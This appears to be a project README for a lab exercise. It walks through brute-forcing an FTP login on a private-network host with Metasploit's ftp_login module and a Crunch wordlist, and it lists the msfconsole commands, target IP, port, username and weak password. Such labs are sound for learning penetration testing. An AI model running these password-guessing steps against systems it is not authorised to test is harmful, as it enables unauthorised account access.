# FTP Password Cracking with Metasploit Framework

This project demonstrates how to retrieve the password of an FTP server using the Metasploit Framework (MSF) on a Kali Linux operating system.

## Project Overview

- **Objective**: Crack the password of an FTP server running on port `2221`.
- **Server Details**:
  - **Username**: `abolfazl`
  - **Password**: `123` (to be cracked)
  - **IP**: `192.168.200.201`
  - **Port**: `2221`

## Tools Used

- **Kali Linux**: The host OS with pre-installed Metasploit Framework.
- **Metasploit Framework**: Specifically, the `ftp_login` auxiliary module.
- **Crunch**: A tool to generate custom wordlists for password cracking.

## Steps to Reproduce

1. **Set Up the Environment**:
   - Ensure the FTP server is running and accessible with the above configurations.

2. **Launch Metasploit**:
   ```bash
   msfconsole
   ```

3. **Load the FTP Login Module**:
   ```bash
   use auxiliary/scanner/ftp/ftp_login
   ```

4. **Configure Options**:
   - Set the target host IP:
     ```bash
     set RHOSTS 192.168.200.201
     ```
   - Set the target port:
     ```bash
     set RPORT 2221
     ```
   - Provide the username and password lists.

5. **Generate a Password List (Optional)**:
   Using Crunch to create a custom password list:
   ```bash
   crunch <min_length> <max_length> <Characters_used> > <saved_file>
   ```

6. **Run the Attack**:
   Start the module:
   ```bash
   run
   ```

7. **Output**:
   The correct password will be identified from the wordlist provided.

## References

- [Metasploit Framework Documentation](https://www.metasploit.com/)
- [Crunch Password Generator](http://crunch.sourceforge.net/)

---
